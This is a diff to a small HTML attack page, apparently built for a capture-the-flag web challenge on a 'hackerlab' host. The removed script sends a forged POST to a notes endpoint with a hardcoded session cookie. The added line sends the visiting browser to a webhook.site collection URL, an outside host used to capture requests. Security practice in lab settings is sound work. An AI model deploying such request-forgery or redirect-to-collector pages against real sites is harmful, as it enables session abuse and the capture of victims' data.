@@ -2,31 +2,7 @@
 <html>
   <body>
 <script>
-  // Les données à envoyer dans le corps de la requête
-  const data = new URLSearchParams();
-  data.append('note-title', 'admin');
-  data.append('note-description', 'admin');
-
-  fetch('https://xnotes.qualif.hackerlab.bj/note.php?id=3390', {
-    method: 'POST',
-    headers: {
-      'Cookie': 'PHPSESSID=70b5662b1d32aac6151996fb9fde9863',
-      'Content-Type': 'application/x-www-form-urlencoded',
-    },
-    body: data
-  })
-  .then(response => {
-    if (!response.ok) {
-      throw new Error('Erreur de requête : ' + response.statusText);
-    }
-    return response.text();
-  })
-  .then(responseText => {
-    console.log('Réponse :', responseText);
-  })
-  .catch(error => {
-    console.error('Erreur :', error);
-  });
+    window.location.href = 'https://webhook.site/0496b1c1-9913-4b2f-a3ac-50ee0bf25492';
 </script>
   </body>
 </html>
